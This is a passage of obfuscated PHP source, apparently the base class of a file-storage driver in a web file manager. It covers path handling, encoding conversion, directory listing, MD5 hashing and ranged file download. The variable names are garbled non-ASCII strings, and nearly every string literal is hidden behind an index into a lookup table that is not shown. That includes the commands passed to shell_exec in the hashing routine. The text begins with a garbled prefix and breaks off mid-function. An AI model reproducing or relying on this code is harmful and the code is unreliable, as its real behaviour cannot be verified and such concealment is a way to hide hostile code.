B™ˆ½¼Å¬¥: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¡ÇİüÕ =& $_SERVER[¹Éµ„ºå]; $this->objectDriver = array($¡ÇİüÕ[60], $¡ÇİüÕ[61], $¡ÇİüÕ[62], $¡ÇİüÕ[63], $¡ÇİüÕ[64], $¡ÇİüÕ[65], $¡ÇİüÕ[66], $¡ÇİüÕ[67], $¡ÇİüÕ[68], $¡ÇİüÕ[69], $¡ÇİüÕ[70], $¡ÇİüÕ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($²ù• ¡) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($²ù• ¡, $_SERVER[¹Éµ„ºå][8]); } return $²ù• ¡; } public function iconvApp($£¯ô²ƒÅ) { return $£¯ô²ƒÅ; } public function iconvSystem($ÆÚ»¼”) { return $ÆÚ»¼”; } public function iconvTo($ŠÆ–Î­ª, $¦¿Šîßë, $Âì—®Òı) { $­ö¢¼Ë =& $_SERVER[¹Éµ„ºå]; if (!$ŠÆ–Î­ª || !function_exists($­ö¢¼Ë[72])) { return $ŠÆ–Î­ª; } static $Ÿ§ûÙÑú = array(); $×ò¡¢öˆ = $¦¿Šîßë . $­ö¢¼Ë[73] . $Âì—®Òı . $­ö¢¼Ë[74] . $ŠÆ–Î­ª; if (isset($Ÿ§ûÙÑú[$×ò¡¢öˆ])) { return $Ÿ§ûÙÑú[$×ò¡¢öˆ]; } if (function_exists($­ö¢¼Ë[75])) { $¸Šú¶±á = @mb_convert_encoding($ŠÆ–Î­ª, $Âì—®Òı, $¦¿Šîßë); } else { $¸Šú¶±á = @iconv($¦¿Šîßë, $Âì—®Òı, $ŠÆ–Î­ª); } $¸Šú¶±á = $¸Šú¶±á ? $¸Šú¶±á : $ŠÆ–Î­ª; if (strstr($¸Šú¶±á, $­ö¢¼Ë[76])) { $¸Šú¶±á = str_replace($­ö¢¼Ë[76], $­ö¢¼Ë[11], $¸Šú¶±á); } $Ÿ§ûÙÑú[$¦¿Šîßë . $­ö¢¼Ë[73] . $Âì—®Òı . $­ö¢¼Ë[74] . $ŠÆ–Î­ª] = $¸Šú¶±á; $Ÿ§ûÙÑú[$Âì—®Òı . $­ö¢¼Ë[73] . $¦¿Šîßë . $­ö¢¼Ë[74] . $ŠÆ–Î­ª] = $ŠÆ–Î­ª; $Ÿ§ûÙÑú[$Âì—®Òı . $­ö¢¼Ë[73] . $¦¿Šîßë . $­ö¢¼Ë[74] . $¸Šú¶±á] = $ŠÆ–Î­ª; $Ÿ§ûÙÑú[$¦¿Šîßë . $­ö¢¼Ë[73] . $Âì—®Òı . $­ö¢¼Ë[74] . $¸Šú¶±á] = $¸Šú¶±á; return $¸Šú¶±á; } public function getPathInner($Îôâ£Š) { $ŠÙö¦‚× = IO::init($Îôâ£Š); return $ŠÙö¦‚×->path; } public function getPathOuter($¿Ê½Ù‰š) { $êÒèë =& $_SERVER[¹Éµ„ºå]; $ö·‚˜÷ = strlen(trim($this->pathBase, $êÒèë[8])); $¿Ê½Ù‰š = substr(trim($¿Ê½Ù‰š, $êÒèë[8]), $ö·‚˜÷); return $this->pathDriver . $êÒèë[8] . ltrim($¿Ê½Ù‰š, $êÒèë[8]); } public function isParentOf($Õç­Éé˜, $™®€èƒõ) { $ßÄƒ²Õœ =& $_SERVER[¹Éµ„ºå]; $Õç­Éé˜ = rtrim(strtolower($Õç­Éé˜), $ßÄƒ²Õœ[8]) . $ßÄƒ²Õœ[8]; $™®€èƒõ = rtrim(strtolower($™®€èƒõ), $ßÄƒ²Õœ[8]) . $ßÄƒ²Õœ[8]; $„ôÁù“¦ = strpos($™®€èƒõ, $Õç­Éé˜) === 0; return $„ôÁù“¦; } public function getType() { $‹‰¾èü =& $_SERVER[¹Éµ„ºå]; $¿ Êí = str_replace($‹‰¾èü[77], $‹‰¾èü[12], get_class($this)); return strtolower($¿ Êí); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ü£âë¶Š, $ÄÁÍŞÊ) { $¥ÇŠ£×± =& $_SERVER[¹Éµ„ºå]; $şÈÏì¾¯ = rtrim($Ü£âë¶Š, $¥ÇŠ£×±[8]) . $¥ÇŠ£×±[8] . $ÄÁÍŞÊ; $¢ÙÈµö— = $this->exist($şÈÏì¾¯); return $¢ÙÈµö— ? $şÈÏì¾¯ : !1; } public function setModifyTime($ıöîôíä, $˜£¿ûÊ = '') { } public function renameObject($çˆÅŠÚ¹, $˜ÍÁãØ) { $é‘¼ä’ = $˜ÍÁãØ; $çˆÅŠÚ¹ = $this->getPathOuter($çˆÅŠÚ¹); $˜ÍÁãØ = $this->pathFather($çˆÅŠÚ¹) . $˜ÍÁãØ; $Œµ“Ì×š = IO::copy($çˆÅŠÚ¹, $this->pathFather($çˆÅŠÚ¹), REPEAT_RENAME_FOLDER, $é‘¼ä’); if ($Œµ“Ì×š) { IO::remove($çˆÅŠÚ¹); } return $Œµ“Ì×š ? $˜ÍÁãØ : !1; } public function tempFile($Š¼€¸— = '', $¿¤çò«ò = '') { if (!$Š¼€¸—) { $Š¼€¸— = rand_string(15); } $ËğüÈ¿ = TEMP_FILES . rand_string(15) . $_SERVER[¹Éµ„ºå][8]; @mkdir($ËğüÈ¿, DEFAULT_PERRMISSIONS, !0); $Ï‡ØèÏÑ = $ËğüÈ¿ . $Š¼€¸—; @touch($Ï‡ØèÏÑ); if ($¿¤çò«ò) { file_put_contents($Ï‡ØèÏÑ, $¿¤çò«ò); } return $Ï‡ØèÏÑ; } public function tempFileRemve($©ÍÍ¯ØË) { @unlink($©ÍÍ¯ØË); @rmdir($this->pathFather($©ÍÍ¯ØË)); } public function mkfile($‰£ÂÉ¤, $¬ŒÆÅÀô = '', $¼œàå£á = REPEAT_RENAME) { } public function mkdir($ŸÍåÈšÑ, $ ÄÌŞ° = REPEAT_SKIP) { } public function delFile($üĞöş‚œ) { } public function delFolder($¨óñˆŠÄ) { } public function copyFile($ŞÛÄş•Ö, $Ú…–İŞ) { } public function moveFile($Åî‹ÄŒô, $ÍÀ¶œ°ì) { } public function remove($Ö×¿”ê‚) { if ($this->isFile($Ö×¿”ê‚)) { return $this->delFile($Ö×¿”ê‚); } return $this->delFolder($Ö×¿”ê‚); } public function rename($„†Ï€×Œ, $¾µ¸æ„À) { } public function exist($¦ÒíÑíª) { } public function isFile($³Ùª¯”Æ) { } public function isFolder($ñå¾Ñ‚æ) { } public function size($üØ¢Š—’) { } public function info($°‡ÒûÆØ) { } public function infoSimple($òĞõõäÉ) { return $this->info($òĞõõäÉ); } public function infoAuth($±‡·–Ù) { return $this->info($±‡·–Ù); } public function infoFull($‹”œËù’) { return $this->info($‹”œËù’); } public function infoFullSimple($¬½’»Ò…) { return $this->info($¬½’»Ò…); } public function infoWithChildren($èÌªí¾õ) { $÷Ø¯§«„ =& $_SERVER[¹Éµ„ºå]; static $‹Œ÷È°— = array(); if (isset($‹Œ÷È°—[$èÌªí¾õ])) { return $‹Œ÷È°—[$èÌªí¾õ]; } $¿éÙõµ˜ = $this->info($èÌªí¾õ); if ($¿éÙõµ˜ && $¿éÙõµ˜[$÷Ø¯§«„[33]] == $÷Ø¯§«„[78]) { $È¨â¢¼§ = array($÷Ø¯§«„[79] => 0, $÷Ø¯§«„[80] => 0, $÷Ø¯§«„[81] => 0); $this->infoChildren($èÌªí¾õ, $È¨â¢¼§); $¿éÙõµ˜[$÷Ø¯§«„[79]] = $È¨â¢¼§[$÷Ø¯§«„[79]]; $¿éÙõµ˜[$÷Ø¯§«„[82]] = array($÷Ø¯§«„[83] => $È¨â¢¼§[$÷Ø¯§«„[80]], $÷Ø¯§«„[84] => $È¨â¢¼§[$÷Ø¯§«„[81]]); $‹Œ÷È°—[$èÌªí¾õ] = $¿éÙõµ˜; } return $¿éÙõµ˜; } public function listPath($Ğ€ı…‘, $òò­øØ = false) { } public function has($˜˜Şœœ, $”™Î§ğ = false, $¤Ò¸²¥Ô = false) { } public function canRead($ÄÎ’‘®×) { } public function canWrite($‹ôöå—«) { } public function getContent($Ù‡²™¨£) { } public function setContent($¸ô”ª¶, $×ç°£ä† = '') { } protected function infoChildren($— šÑ, &$¤ËÁ²éä) { $ªŠîŠÚ‘ =& $_SERVER[¹Éµ„ºå]; check_abort_echo(); $°ö£¼° = $this->listPath($— šÑ, !0); $°ö£¼° = array_merge($°ö£¼°[$ªŠîŠÚ‘[85]], $°ö£¼°[$ªŠîŠÚ‘[86]]); foreach ($°ö£¼° as $äŞ¡Éº¸) { if ($äŞ¡Éº¸[$ªŠîŠÚ‘[33]] == $ªŠîŠÚ‘[78]) { $¤ËÁ²éä[$ªŠîŠÚ‘[81]]++; $˜²ù£€® = $this->getPathInner($äŞ¡Éº¸[$ªŠîŠÚ‘[87]]); $this->infoChildren($˜²ù£€®, $¤ËÁ²éä); } else { $¤ËÁ²éä[$ªŠîŠÚ‘[80]]++; $¤ËÁ²éä[$ªŠîŠÚ‘[79]] += $äŞ¡Éº¸[$ªŠîŠÚ‘[79]]; } } } public function fileSubstr($Ê›±…¢, $”É·âÙ, $åÂõÀ‘Ë) { } public function listAll($åì×çšø) { } public function listAllMake($œãÓ”®¦, &$ØÜº‡±±) { $¥º¥¬Â =& $_SERVER[¹Éµ„ºå]; check_abort_echo(); $È©ıÏê— = $this->listPath($œãÓ”®¦, !0); if (!$È©ıÏê—) { return; } $„ßÎ°ôş = array_merge($È©ıÏê—[$¥º¥¬Â[85]], $È©ıÏê—[$¥º¥¬Â[86]]); foreach ($„ßÎ°ôş as $åÈ§Öé‘) { $«ç“È = $åÈ§Öé‘[$¥º¥¬Â[33]] == $¥º¥¬Â[78]; $ÌíØÙ¿§ = array($¥º¥¬Â[87] => $åÈ§Öé‘[$¥º¥¬Â[87]], $¥º¥¬Â[78] => $«ç“È); if (isset($åÈ§Öé‘[$¥º¥¬Â[79]])) { $ÌíØÙ¿§[$¥º¥¬Â[79]] = $åÈ§Öé‘[$¥º¥¬Â[79]]; } if (isset($åÈ§Öé‘[$¥º¥¬Â[88]])) { $ÌíØÙ¿§[$¥º¥¬Â[88]] = $åÈ§Öé‘[$¥º¥¬Â[88]]; } if (!$«ç“È) { $ØÜº‡±±[] = $ÌíØÙ¿§; continue; } $ØÜº‡±±[] = $ÌíØÙ¿§; $©İÃù• = $åÈ§Öé‘[$¥º¥¬Â[87]]; $Şì†¡Íë = $this->pathDriver; if (substr($åÈ§Öé‘[$¥º¥¬Â[87]], 0, strlen($Şì†¡Íë)) == $Şì†¡Íë) { $©İÃù• = substr($©İÃù•, strlen($Şì†¡Íë)); } $this->listAllMake($©İÃù•, $ØÜº‡±±); } } public function listAllSimple($ğª‚“Å, $õº¼ç‰ù = false) { $­Öˆ§÷ = $this->listAll($ğª‚“Å); return $this->listAllSimpleMake($­Öˆ§÷, $this->getPathOuter($ğª‚“Å), $õº¼ç‰ù); } public function listAllSimpleMake($‡Âã‘»‡, $‘æ¸Ã¾˜, $Æ˜ËŸá) { $äè¿˜„Ø =& $_SERVER[¹Éµ„ºå]; $¯ß•ˆ»î = array(); $‘æ¸Ã¾˜ = rtrim(get_path_father($‘æ¸Ã¾˜), $äè¿˜„Ø[8]) . $äè¿˜„Ø[8]; foreach ($‡Âã‘»‡ as $â¯²Œ‹) { $ŸŒ¥Ìí÷ = array($äè¿˜„Ø[87] => $â¯²Œ‹[$äè¿˜„Ø[87]], $äè¿˜„Ø[89] => $â¯²Œ‹[$äè¿˜„Ø[87]], $äè¿˜„Ø[78] => $â¯²Œ‹[$äè¿˜„Ø[78]]); if (isset($â¯²Œ‹[$äè¿˜„Ø[79]]) && !$â¯²Œ‹[$äè¿˜„Ø[78]]) { $ŸŒ¥Ìí÷[$äè¿˜„Ø[79]] = $â¯²Œ‹[$äè¿˜„Ø[79]]; } if (isset($â¯²Œ‹[$äè¿˜„Ø[88]])) { $ŸŒ¥Ìí÷[$äè¿˜„Ø[88]] = $â¯²Œ‹[$äè¿˜„Ø[88]]; } if (is_array($â¯²Œ‹[$äè¿˜„Ø[90]])) { $ŸŒ¥Ìí÷[$äè¿˜„Ø[89]] = $â¯²Œ‹[$äè¿˜„Ø[90]][$äè¿˜„Ø[87]]; $ŸŒ¥Ìí÷[$äè¿˜„Ø[79]] = $â¯²Œ‹[$äè¿˜„Ø[90]][$äè¿˜„Ø[79]]; $ŸŒ¥Ìí÷[$äè¿˜„Ø[88]] = $â¯²Œ‹[$äè¿˜„Ø[90]][$äè¿˜„Ø[88]]; } else { if (substr($â¯²Œ‹[$äè¿˜„Ø[87]], 0, strlen($‘æ¸Ã¾˜)) == $‘æ¸Ã¾˜) { $ŸŒ¥Ìí÷[$äè¿˜„Ø[87]] = substr($â¯²Œ‹[$äè¿˜„Ø[87]], strlen($‘æ¸Ã¾˜)); } } $ï‰¬ø½Ë = $â¯²Œ‹[$äè¿˜„Ø[78]] ? $äè¿˜„Ø[8] : $äè¿˜„Ø[12]; $ŸŒ¥Ìí÷[$äè¿˜„Ø[89]] = rtrim($ŸŒ¥Ìí÷[$äè¿˜„Ø[89]], $äè¿˜„Ø[8]) . $ï‰¬ø½Ë; $ŸŒ¥Ìí÷[$äè¿˜„Ø[87]] = $äè¿˜„Ø[8] . trim($ŸŒ¥Ìí÷[$äè¿˜„Ø[87]], $äè¿˜„Ø[8]) . $ï‰¬ø½Ë; if (!$Æ˜ËŸá) { $Œˆ¯ÆÛô = explode($äè¿˜„Ø[8], trim($ŸŒ¥Ìí÷[$äè¿˜„Ø[87]], $äè¿˜„Ø[8])); $ŸŒ¥Ìí÷[$äè¿˜„Ø[87]] = $äè¿˜„Ø[8] . implode($äè¿˜„Ø[8], array_slice($Œˆ¯ÆÛô, 1)) . $ï‰¬ø½Ë; } $¯ß•ˆ»î[] = $ŸŒ¥Ìí÷; } return array_sort_by($¯ß•ˆ»î, $äè¿˜„Ø[87]); } public function upload($®Á¬ı˜³, $üïØîÜ, $•Õ¢øÇÕ = false, $æß–¹Äâ = REPEAT_REPLACE) { } public function uploadFileByID($øøñÃŒÎ, $‹Ó”ÕÕ‡, $ò‹ï´ÊŸ) { } public function uploadFileByPath($½‹Ó¤Ñ, $˜Ã¡ë÷Ô, $ûÀôÇ«÷ = array()) { } public function isUploadServer() { $ÈŞĞ¼å =& $_SERVER[¹Éµ„ºå]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ÈŞĞ¼å[91]) { return !0; } return $GLOBALS[$ÈŞĞ¼å[6]][$ÈŞĞ¼å[92]][$ÈŞĞ¼å[93]]; } public function isFileOutServer() { $íö–Ôù³ =& $_SERVER[¹Éµ„ºå]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $íö–Ôù³[91]) { return !0; } return $GLOBALS[$íö–Ôù³[6]][$íö–Ôù³[92]][$íö–Ôù³[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($„æÒª²Ô) { $Ö­«¦¤ =& $_SERVER[¹Éµ„ºå]; if (!$this->isCdnHost()) { return $„æÒª²Ô; } return str_replace(trim(get_url_root($„æÒª²Ô), $Ö­«¦¤[8]), trim($this->cdnHost, $Ö­«¦¤[8]), $„æÒª²Ô); } public function uploadLink($İÃÊàÍ, $Ù–˜û‹— = 0) { $ìÂ¿÷ıØ =& $_SERVER[¹Éµ„ºå]; if ($this->isUploadServer()) { return; } $şŸåü¹¤ = $this->getType(); if (!in_array($şŸåü¹¤, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $µ÷ËÆ‰† = 1024 * 1024 * 10; $˜™ä€¸Ê = (!$Ù–˜û‹— ? 1 : ceil($Ù–˜û‹— / pow(1024, 3))) * 3600 * 4; if ($Ù–˜û‹— <= $µ÷ËÆ‰†) { $¶¼¡Õ­ˆ = $this->uploadFormData($İÃÊàÍ, $˜™ä€¸Ê); } else { $¶¼¡Õ­ˆ = $this->uploadMultiData($İÃÊàÍ, $˜™ä€¸Ê); } if ($¶¼¡Õ­ˆ) { $¶¼¡Õ­ˆ[$ìÂ¿÷ıØ[95]] = $İÃÊàÍ; $¶¼¡Õ­ˆ[$ìÂ¿÷ıØ[96]] = $şŸåü¹¤; } return $¶¼¡Õ­ˆ; } public function uploadFormData($èİêÖ®›, $ûå¼›·ú = 3600) { } public function uploadMultiData($æ«½’ğ’, $à¨—à‹  = 3600) { } public function multiUploadFormData($—áà¼ÁŠ, $¤×ç›‚ = 3600) { return $this->uploadMultiData($—áà¼ÁŠ, $¤×ç›‚); } public function download($Â’²»ìØ, $¸ÕïÓÌª) { } public function ext($Œõ˜âœé) { return get_path_ext($Œõ˜âœé); } public function pathThis($ÌŠŸœ‰Â) { $Ç˜åİŠ­ =& $_SERVER[¹Éµ„ºå]; $ÌŠŸœ‰Â = str_replace($Ç˜åİŠ­[97], $Ç˜åİŠ­[8], rtrim($ÌŠŸœ‰Â, $Ç˜åİŠ­[8])); $ìËÅ‡‚­ = strrpos($ÌŠŸœ‰Â, $Ç˜åİŠ­[8]); if ($ìËÅ‡‚­ === !1) { return $ÌŠŸœ‰Â; } return substr($ÌŠŸœ‰Â, $ìËÅ‡‚­ + 1); } public function pathFather($’Â¢´ùÔ) { $£áôóõ¶ =& $_SERVER[¹Éµ„ºå]; $’Â¢´ùÔ = str_replace($£áôóõ¶[97], $£áôóõ¶[8], rtrim($’Â¢´ùÔ, $£áôóõ¶[8])); $¶ë¨’½ = strrpos($’Â¢´ùÔ, $£áôóõ¶[8]); if ($¶ë¨’½ === !1) { return $£áôóõ¶[12]; } return substr($’Â¢´ùÔ, 0, $¶ë¨’½ + 1); } public function hashSimple($ƒîòºç) { $Ï™ìá€‰ =& $_SERVER[¹Éµ„ºå]; if (!$ƒîòºç) { return md5($Ï™ìá€‰[12]); } $¸€ë¶§ï = $this->size($ƒîòºç); $½ÇÖÑâ‹ = 200; $Î™°¾Á™ = 50; if ($¸€ë¶§ï <= $½ÇÖÑâ‹ * $Î™°¾Á™) { return $this->hashMd5($ƒîòºç) . $¸€ë¶§ï; } $ÅùñóŠ± = intval($¸€ë¶§ï / $Î™°¾Á™); $±„üÖŠ = $Ï™ìá€‰[12]; for ($®şƒ§ı« = 0; $®şƒ§ı« < $Î™°¾Á™; $®şƒ§ı«++) { $±„üÖŠ .= $this->fileSubstr($ƒîòºç, $ÅùñóŠ± * $®şƒ§ı«, $½ÇÖÑâ‹); } $±„üÖŠ .= $this->fileSubstr($ƒîòºç, $¸€ë¶§ï - $½ÇÖÑâ‹, $½ÇÖÑâ‹); return md5($±„üÖŠ) . $¸€ë¶§ï; } public static $md5Cache = array(); public function hashMd5($æ¡½ŞÒİ) { if (!$æ¡½ŞÒİ) { return md5($_SERVER[¹Éµ„ºå][12]); } $æ¡½ŞÒİ = $this->iconvSystem($æ¡½ŞÒİ); if (isset(self::$md5Cache[$æ¡½ŞÒİ])) { return self::$md5Cache[$æ¡½ŞÒİ]; } self::$md5Cache[$æ¡½ŞÒİ] = $this->hashMd5Shell($æ¡½ŞÒİ); if (!self::$md5Cache[$æ¡½ŞÒİ]) { self::$md5Cache[$æ¡½ŞÒİ] = @md5_file($æ¡½ŞÒİ); } return self::$md5Cache[$æ¡½ŞÒİ]; } private function hashMd5Shell($É™³ËÓ) { $ò´À‚ËĞ =& $_SERVER[¹Éµ„ºå]; if (!$É™³ËÓ) { return md5($ò´À‚ËĞ[12]); } if (!function_exists($ò´À‚ËĞ[98])) { return !1; } $ú¬Õºôƒ = array($ò´À‚ËĞ[99], $ò´À‚ËĞ[100]); $÷²îß¾ß = Cache::get($ò´À‚ËĞ[101]); if (!$÷²îß¾ß) { $¢œúÖöÅ = BASIC_PATH . $ò´À‚ËĞ[102]; $¸Óµ™©Ñ = md5_file($¢œúÖöÅ); $÷²îß¾ß = $ò´À‚ËĞ[103]; foreach ($ú¬Õºôƒ as $ÅêÖŸŒ) { $İËíë¶Ö = shell_exec($ÅêÖŸŒ . $ò´À‚ËĞ[53] . escapeShell($¢œúÖöÅ)); if ($İËíë¶Ö && substr(trim($İËíë¶Ö), 0, 32) == $¸Óµ™©Ñ) { $÷²îß¾ß = $ÅêÖŸŒ; break; } } Cache::set($ò´À‚ËĞ[101], $÷²îß¾ß, 3600); } if ($÷²îß¾ß == $ò´À‚ËĞ[103]) { return !1; } $İËíë¶Ö = shell_exec($÷²îß¾ß . $ò´À‚ËĞ[53] . escapeShell($É™³ËÓ)); $İËíë¶Ö = str_replace($ò´À‚ËĞ[104], $ò´À‚ËĞ[12], $İËíë¶Ö); return substr($İËíë¶Ö, 0, 32); } public function link($ßÇšˆùÄ) { return $ßÇšˆùÄ; } public function fileOut($—ÛÏ’ë, $Ú›Ï§¿È = false, $…Ì¹²ğ = false, $šŸˆà = '') { $°İËûŞ =& $_SERVER[¹Éµ„ºå]; $this->cacheMethod(null, null); if (!$—ÛÏ’ë || !$this->exist($—ÛÏ’ë)) { show_json(LNG($°İËûŞ[105]), !1, $…Ì¹²ğ); } $Œ«ñçÖ¾ = $this->getType() == $°İËûŞ[106]; $©”Ù’á– = $GLOBALS[$°İËûŞ[6]][$°İËûŞ[92]][$°İËûŞ[107]][$°İËûŞ[108]]; $º½˜ã¨­ = (double) $GLOBALS[$°İËûŞ[6]][$°İËûŞ[92]][$°İËûŞ[107]][$°İËûŞ[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $˜‰„Ÿäâ = $this->infoFull($—ÛÏ’ë); $¹ğæ‡¶Š = $˜‰„Ÿäâ[$°İËûŞ[79]]; $´ÈÒç¥ = gmdate($°İËûŞ[110], $˜‰„Ÿäâ[$°İËûŞ[88]]); $ªõ¨˜“› = $…Ì¹²ğ ? $…Ì¹²ğ : $this->iconvApp($˜‰„Ÿäâ[$°İËûŞ[32]]); $òâÀšÌƒ = 0; $ê·âáñ» = $¹ğæ‡¶Š - 1; $¨•×‹À½ = $this->ext($ªõ¨˜“›); if (in_array($¨•×‹À½, array($°İËûŞ[111], $°İËûŞ[112], $°İËûŞ[113], $°İËûŞ[114]))) { $¨•×‹À½ = $°İËûŞ[115]; } if (in_array($¨•×‹À½, array($°İËûŞ[116]))) { $¨•×‹À½ = $°İËûŞ[117]; } if (!$šŸˆà) { $šŸˆà = md5($´ÈÒç¥ . $¹ğæ‡¶Š); } $šŸˆà = $°İËûŞ[118] . $šŸˆà . $°İËûŞ[118]; $àƒ€ñø = get_file_mime($¨•×‹À½); $¥“ĞÏâÚ = !0; $¥“ĞÏâÚ = isset($_GET[$°İËûŞ[119]]) ? !1 : !0; if ($Ú›Ï§¿È === !1 && !mime_support($àƒ€ñø)) { $àƒ€ñø = $°İËûŞ[120]; } header($°İËûŞ[121]); header($°İËûŞ[122] . $àƒ€ñø); $îÇÂ™Ê¼ = rawurlencode($ªõ¨˜“›); $îÇÂ™Ê¼ = $°İËûŞ[118] . $îÇÂ™Ê¼ . $°İËûŞ[123] . $îÇÂ™Ê¼; if ($Ú›Ï§¿È) { header($°İËûŞ[124]); header($°İËûŞ[125] . $îÇÂ™Ê¼); } else { if ($¥“ĞÏâÚ) { header($°İËûŞ[126] . $îÇÂ™Ê¼); } } $„–ïÖ” = 3600 * 24 * 30; header($°İËûŞ[127]); header($°İËûŞ[128]); header($°İËûŞ[129] . $„–ïÖ”); header($°İËûŞ[130] . gmdate($°İËûŞ[110], time() + $„–ïÖ”) . $°İËûŞ[131]); if (isset($_SERVER[$°İËûŞ[132]]) && strtotime($_SERVER[$°İËûŞ[132]]) == $˜‰„Ÿäâ[$°İËûŞ[88]]) { header($°İËûŞ[133], !0, 304); die; } if (isset($_SERVER[$°İËûŞ[134]]) && $_SERVER[$°İËûŞ[134]] == $šŸˆà) { header($°İËûŞ[135] . $šŸˆà, !0, 304); die; } header($°İËûŞ[135] . $šŸˆà); header($°İËûŞ[136] . $´ÈÒç¥ . $°İËûŞ[131]); header($°İËûŞ[137] . rawurlencode($ªõ¨˜“›)); header($°İËûŞ[138]); header($°İËûŞ[139] . $¹ğæ‡¶Š); header($°İËûŞ[140]); Hook::trigger($°İËûŞ[141], $—ÛÏ’ë, $¹ğæ‡¶Š, $ªõ¨˜“›, $¨•×‹À½); if (!$Ú›Ï§¿È && $¨•×‹À½ == $°İËûŞ[142]) { if ($¹ğæ‡¶Š > 1024 * 1024 * 10) { die; } $ØÕ¤˜¾£ = $this->getContent($—ÛÏ’ë); $ØÕ¤˜¾£ = Html::clearSVG($ØÕ¤˜¾£); header($°İËûŞ[143] . strlen($ØÕ¤˜¾£)); echo $ØÕ¤˜¾£; die; } $¤ª‘²ô = strtolower($_SERVER[$°İËûŞ[144]]); if ($Œ«ñçÖ¾ && $¤ª‘²ô && $©”Ù’á–) { if (strstr($¤ª‘²ô, $°İËûŞ[145])) { header($°İËûŞ[146] . $—ÛÏ’ë); } else { if (strstr($¤ª‘²ô, $°İËûŞ[147])) { header($°İËûŞ[148] . $—ÛÏ’ë); } else { if (strstr($¤ª‘²ô, $°İËûŞ[149])) { header($°İËûŞ[150] . $—ÛÏ’ë); } } } if ($º½˜ã¨­) { header($°İËûŞ[151] . $º½˜ã¨­); } return; } if (isset($_SERVER[$°İËûŞ[152]])) { if (preg_match($°İËûŞ[153], $_SERVER[$°İËûŞ[152]], $Ì¾áğóÓ)) { $òâÀšÌƒ = intval($Ì¾áğóÓ[1]); $òâÀšÌƒ = $òâÀšÌƒ <= 0 ? 0 : ($òâÀšÌƒ >= $ê·âáñ» ? $ê·âáñ» : $òâÀšÌƒ); if (!empty($Ì¾áğóÓ[2])) { $äé‚ïâ = intval($Ì¾áğóÓ[2]); $ê·âáñ» = $äé‚ïâ < $òâÀšÌƒ ? $òâÀšÌƒ : ($äé‚ïâ >= $ê·âáñ» ? $ê·âáñ» : $äé‚ïâ); } } header($°İËûŞ[154]); header("\x43\x6f\156\x74\x65\156\164\55\122\x61\156\x67\x65\72\40\142\x79\164\x65\163\40{$òâÀšÌƒ}\x2d{$ê·âáñ»}\57" . $¹ğæ‡¶Š); } else { header($°İËûŞ[155]); } header($°İËûŞ[156]); header($°İËûŞ[157]); $Ï¶¢¿æş = !0; if ($_SERVER[$°İËûŞ[158]] == $°İËûŞ[159] && $¹ğæ‡¶Š > 1204 * 1024 * 1024 * 2) { $Ï¶¢¿æş = !1; } if ($Ï¶¢¿æş) { header($°İËûŞ[160] . ($ê·âáñ» - $òâÀšÌƒ + 1)); } if ($_SERVER[$°İËûŞ[161]] == $°İËûŞ[162]) { return; } $—àìË£ = array($°İËûŞ[163] => !1, $°İËûŞ[164] => $òâÀšÌƒ, $°İËûŞ[165] => $ê·âáñ», $°İËûŞ[166] => $¨•×‹À½, $°İËûŞ[167] => $˜‰„Ÿäâ, $°İËûŞ[168] => $°İËûŞ[12], $°İËûŞ[169] => 0); $—àìË£ = Hook::filter($°İËûŞ[170], $—àìË£); $ä®ÃÕõŸ = 1024 * 300; $ø‚óË = 0; if ($º½˜ã¨­) { $ø‚óË = intval(1000 * 1000 * ($ä®ÃÕõŸ / $º½˜ã¨­)); } while ($òâÀšÌƒ <= $ê·âáñ») { $©ÒüÕİ¶ = timeFloat(); check_abort(); $ó†¬ÙôÈ = $ê·âáñ» - $òâÀšÌƒ + 1; if ($ó†¬ÙôÈ <= $ä®ÃÕõŸ) { $ä®ÃÕõŸ = $ó†¬ÙôÈ; } $ØÕ¤˜¾£ = $this->fileSubstr($—ÛÏ’ë, $òâÀšÌƒ, $ä®ÃÕõŸ); if ($—àìË£[$°İËûŞ[163]]) { $—àìË£[$°İËûŞ[168]] = $ØÕ¤˜¾£; $—àìË£[$°İËûŞ[169]] = $òâÀšÌƒ; $—àìË£ = Hook::filter($°İËûŞ[171], $—àìË£); $ØÕ¤˜¾£ = $—àìË£[$°İËûŞ[168]]; } echo $ØÕ¤˜¾£; $òâÀšÌƒ += $ä®ÃÕõŸ; if ($ä®ÃÕõŸ == $ó†¬ÙôÈ) { $òâÀšÌƒ = $ê·âáñ» + 1; } if ($ø‚óË) { $ü¡”íêç = intval(1000 * 1000 * (timeFloat() - $©ÒüÕİ¶)); $¥Ä˜Ô› = $ø‚óË - $ü¡”íêç; if ($¥Ä˜Ô› > 5) { usleep($¥Ä˜Ô›); } } } } public function fileOutServer($¯ÔàË‚œ, $…âµªŠ‡ = false, $ó½è¥â = false, $¡€ß„¯ü = '') { $this->fileOut($¯ÔàË‚œ, $…âµªŠ‡, $ó½è¥â, $¡€ß„¯ü); } public function fileOutLink($õÕ·´Ç) { header($_SERVER[¹Éµ„ºå][172] . $õÕ·´Ç); die; } public function cacheMethod($íŒ‰ÜŸÌ, $œßù©ÅÇ, $²Ô„ò¼  = null) { $¾¾È¿¯Ù =& $_SERVER[¹Éµ„ºå]; static $Å§É˜ª¯ = array(); $Ê®§ÁÎÚ = $œßù©ÅÇ ? ltrim($this->getPathOuter($œßù©ÅÇ), $¾¾È¿¯Ù[8]) : $¾¾È¿¯Ù[12]; $¶ÁÛÛŠ† = $¾¾È¿¯Ù[173] . $íŒ‰ÜŸÌ . $¾¾È¿¯Ù[174] . rtrim($Ê®§ÁÎÚ, $¾¾È¿¯Ù[8]); if (is_null($íŒ‰ÜŸÌ)) { $Å§É˜ª¯ = array(); return; } if (is_null($œßù©ÅÇ)) { foreach ($Å§É˜ª¯ as $¶ÁÛÛŠ† => $»öÁÅ’Ş) { if (!strstr($¶ÁÛÛŠ†, $¾¾È¿¯Ù[173] . $íŒ‰ÜŸÌ . $¾¾È¿¯Ù[175])) { continue; } unset($Å§É˜ª¯[$¶ÁÛÛŠ†]); } return; } if ($²Ô„ò¼  === $¾¾È¿¯Ù[176]) { 